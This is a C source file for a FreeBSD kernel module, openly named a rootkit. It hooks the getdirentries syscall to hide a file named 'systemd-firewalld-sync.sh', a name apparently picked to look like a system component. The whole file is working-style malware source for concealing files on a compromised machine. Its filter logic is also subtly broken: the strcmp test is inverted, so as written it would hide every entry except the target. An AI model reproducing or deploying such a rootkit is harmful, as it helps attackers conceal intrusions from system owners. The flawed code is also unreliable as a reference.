#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/types.h>
#include <sys/malloc.h>
#include <dirent.h>

static sy_call_t *original_getdirentries;

# define FILENAME "systemd-firewalld-sync.sh"
// sysent[SYS_getdirentries].sy_call = (sy_call_t *)bds_getdirentries;
/* Custom mkdir handler */
static int custom_getdirentries(struct thread *td, void *args) {
	struct getdirentries_args *uap;
	unsigned int size, count;
	int error;
	struct dirent *dp, *current;

	uap = (struct getdirentries_args *)args;
	error = sys_getdirentries(td, args);
	size = td->td_retval[0];
	
	if (size > 0) {
		dp = malloc(size, M_TEMP, M_WAITOK);
		copyin(uap->buf, dp, size);

		count = size;
		current = dp;

		while ((current->d_reclen != 0) && (count > 0)) {
			count -= current->d_reclen;
			// critical line right here, this is what matches and removes the filename
            // og line uses strstr to match anything with some standard naming convention string
			if (strcmp(current->d_name, FILENAME)) {
				if (count != 0) {
					bcopy((char *)current + current->d_reclen, current, count);
				}
				size -= current->d_reclen;
			}
	
			if (count > 0) {
				current = (struct dirent *)	((char *)current + current->d_reclen);
			}
		}

		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);
		free(dp, M_TEMP);
	}

	return error;
}

// Create a handler for the LKM, See 5.
static int rootkit_handler(struct module *module, int event, void *arg) {

    switch (event) {
    case MOD_LOAD:
        original_getdirentries = sysent[SYS_getdirentries].sy_call;
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)custom_getdirentries;
        printf("[LKM] Hooked dirs!\n");
        break;
    case MOD_UNLOAD:
        printf("Goodbye, Kernel!\n");
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
        // sysent[SYS_getdirentries].sy_call = original_getdirentries;
        break;
    default:
        return EOPNOTSUPP;  // Unsupported operation
    }
    return 0;
}

// Module metadata and registration, See 6.
static moduledata_t rootkit_mod = {
    "dir_lkm",              // Module name
    rootkit_handler,        // Event handler
    NULL                  // Extra data (optional)
};

// Register the module, See 7.
DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);